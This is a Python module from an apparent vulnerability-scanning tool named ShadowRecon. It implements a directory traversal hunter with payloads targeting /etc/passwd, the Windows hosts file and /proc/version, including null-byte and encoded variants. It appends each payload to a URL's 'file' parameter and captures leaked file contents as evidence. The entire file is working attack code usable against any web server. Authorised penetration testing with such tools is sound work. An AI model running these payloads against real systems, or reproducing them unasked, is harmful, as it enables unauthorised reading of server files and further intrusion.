"""
Directory Traversal Hunter for ShadowRecon v1.0
"""

from typing import List, Dict, Any
import asyncio

class DirectoryTraversalHunter:
    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '../../../proc/version',
            '../../../../../../../../etc/passwd%00',
            '..%2f..%2f..%2fetc%2fpasswd',
            '....//....//....//etc/passwd'
        ]

    async def test_endpoint(self, endpoint: Dict[str, Any], session) -> List[Dict[str, Any]]:
        """Test endpoint for directory traversal vulnerabilities"""
        vulnerabilities = []

        if not session:
            return vulnerabilities

        url = endpoint.get('url', '')
        if not url:
            return vulnerabilities

        for payload in self.traversal_payloads[:3]:  # Limit for performance
            try:
                from ..utils.http_utils import HTTPUtils

                test_url = f"{url}?file={payload}"
                response = await HTTPUtils.safe_request(session, 'GET', test_url)

                if response and response.get('status') == 200:
                    content = response.get('content', '')
                    if 'root:' in content or 'daemon:' in content or '[fonts]' in content:
                        vulnerability = {
                            'type': 'directory_traversal',
                            'severity': 'high',
                            'url': test_url,
                            'payload': payload,
                            'evidence': f'Directory traversal successful: {content[:100]}...',
                            'method': 'GET'
                        }
                        vulnerabilities.append(vulnerability)

                        if self.verbose:
                            print(f"[!] Directory traversal found: {test_url}")
                        break

            except Exception as e:
                if self.verbose:
                    print(f"[!] Error testing directory traversal: {e}")
                continue

        return vulnerabilities
